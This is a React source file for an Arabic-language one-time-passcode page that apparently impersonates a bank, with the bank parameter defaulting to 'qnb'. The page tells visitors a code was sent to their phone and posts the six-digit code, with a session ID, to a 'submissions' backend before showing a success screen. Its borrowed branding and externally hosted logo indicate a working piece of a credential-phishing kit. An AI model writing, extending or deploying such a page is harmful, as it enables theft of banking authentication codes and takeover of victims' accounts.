import { useState } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export default function Otp() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const sessionId = localStorage.getItem("sessionId") || "";

  const [otp, setOtp] = useState("");
  const submitOtpMutation = trpc.submissions.submitOtp.useMutation();

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
    setOtp(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== 6) {
      toast.error("يجب أن يكون الرمز 6 أرقام");
      return;
    }
    try {
      await submitOtpMutation.mutateAsync({
        sessionId,
        otpCode: otp,
        otpType: "standard",
      });
      toast.success("تم التحقق بنجاح");
      setLocation(`/success?bank=${bank}&session=${sessionId}`);
    } catch (error) {
      toast.error("حدث خطأ في التحقق");
    }
  };

  return (
    <html lang="ar" dir="rtl">
      <head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>التحقق من الرمز</title>
        <style>{`
          body { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding-top: 70px; display: flex; flex-direction: column; min-height: 100vh; }
          .header { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
          .logo { height: 40px; }
          .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
          .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
          
          .container { padding: 40px 20px; flex: 1; text-align: center; }
          .otp-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
          
          .otp-input { width: 100%; padding: 20px; border: 2px solid #ddd; border-radius: 8px; font-size: 24px; text-align: center; font-weight: bold; margin: 20px 0; box-sizing: border-box; letter-spacing: 5px; }
          .otp-input:focus { border-color: #8C0032; outline: none; }
          
          .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
          .footer-image { width: 100%; display: block; margin-top: 20px; }
        `}</style>
      </head>
      <body>
        <header className="header">
          <div className="menu-icon">&#9776;</div>
          <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" />
          <a href="otp_en.html" className="lang-btn" style={{ textDecoration: "none" }}>
            English
          </a>
        </header>

        <div className="container">
          <div className="otp-box">
            <h2>أدخل رمز التحقق (OTP)</h2>
            <p>تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
            <form onSubmit={handleSubmit}>
              <input
                type="text"
                className="otp-input"
                placeholder="------"
                maxLength={6}
                value={otp}
                onChange={handleOtpChange}
                required
              />
              <button type="submit" className="submit-btn">
                تأكيد الرمز
              </button>
            </form>
          </div>
        </div>

        <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
      </body>
    </html>
  );
}
